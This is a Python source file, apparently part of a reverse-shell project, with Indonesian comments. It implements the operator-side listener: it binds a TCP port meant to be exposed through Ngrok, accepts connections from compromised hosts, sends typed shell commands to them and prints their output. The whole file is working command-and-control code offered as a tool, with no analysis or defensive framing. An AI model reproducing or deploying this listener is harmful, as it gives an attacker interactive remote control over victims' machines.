# /home/pblrks611/PROTO/reverse_shell/server_improved.py

import socket
import threading
import struct
import os

HOST = "0.0.0.0"
PORT = 4465 # Port yang akan diekspos oleh Ngrok

def send_data(sock, data):
    """Mengemas ukuran data, lalu mengirim ukuran dan datanya."""
    try:
        data_len = struct.pack('>I', len(data))
        sock.sendall(data_len + data)
    except Exception:
        return

def receive_data(sock):
    """Menerima ukuran data, lalu menerima data sebenarnya."""
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        
        full_data = b''
        while len(full_data) < msglen:
            packet = sock.recv(msglen - len(full_data))
            if not packet:
                return None
            full_data += packet
        return full_data
    except Exception:
        return None

def handle_client(client_socket, addr):
    print(f"\n[+] Koneksi diterima dari {addr[0]}:{addr[1]}")

    while True:
        try:
            cmd = input(f"shell@{addr[0]} >> ")
            if not cmd:
                continue

            if cmd.lower() == "exit":
                send_data(client_socket, cmd.encode())
                client_socket.close()
                print(f"[-] Koneksi ke {addr[0]} ditutup.")
                break
            
            # Kirim perintah umum
            send_data(client_socket, cmd.encode())
            
            # Menerima output
            output = receive_data(client_socket)
            if output:
                print(output.decode("utf-8", errors="ignore"))

        except (BrokenPipeError, ConnectionResetError):
            print(f"\n[!] Koneksi ke {addr[0]} terputus.")
            break
        except Exception as e:
            print(f"\n[!] Terjadi error: {e}")
            break

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listener Reverse Shell berjalan di {HOST}:{PORT} ...")

    while True:
        client, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(client, addr))
        thread.start()

if __name__ == "__main__":
    start_listener()
